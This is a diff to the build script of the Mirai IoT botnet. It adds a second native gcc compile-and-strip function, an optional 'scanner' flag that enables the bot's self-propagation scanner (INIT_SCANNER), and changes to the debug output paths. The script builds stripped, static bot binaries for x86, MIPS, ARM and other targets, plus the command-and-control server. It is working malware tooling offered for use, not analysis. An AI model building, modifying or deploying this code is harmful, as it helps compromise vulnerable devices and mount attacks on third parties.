@@ -8,7 +8,13 @@ function compile_bot {
     "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
 }
 
-if [ $# == 2 ]; then
+function compile_bot_2 {
+    echo "Compiling $2"
+    gcc -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    strip release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
+}
+
+if [ $# -ge 2 ]; then
     if [ "$2" == "telnet" ]; then
         FLAGS="-DMIRAI_TELNET"
     elif [ "$2" == "ssh" ]; then
@@ -16,11 +22,15 @@ if [ $# == 2 ]; then
     fi
 else
     echo "Missing build type." 
-    echo "Usage: $0 <debug | release> <telnet | ssh>"
+    echo "Usage: $0 <debug | release> <telnet | ssh> [scanner]"
+fi
+
+if [ "$3" == "scanner" ]; then
+    FLAGS="$FLAGS -DINIT_SCANNER"
 fi
 
 if [ $# == 0 ]; then
-    echo "Usage: $0 <debug | release> <telnet | ssh>"
+    echo "Usage: $0 <debug | release> <telnet | ssh> [scanner]"
 elif [ "$1" == "release" ]; then
     rm release/mirai.*
     rm release/miraint.*
@@ -29,6 +39,7 @@ elif [ "$1" == "release" ]; then
     go build -o ../release/cnc
     )
     compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
+    compile_bot_2 x86 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
@@ -53,7 +64,8 @@ elif [ "$1" == "release" ]; then
 
     go build -o release/scanListen tools/scanListen.go
 elif [ "$1" == "debug" ]; then
-    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+    # gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+    mkdir -p debug/bins ; gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/bins/mirai.x86
     mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
     armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
     armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
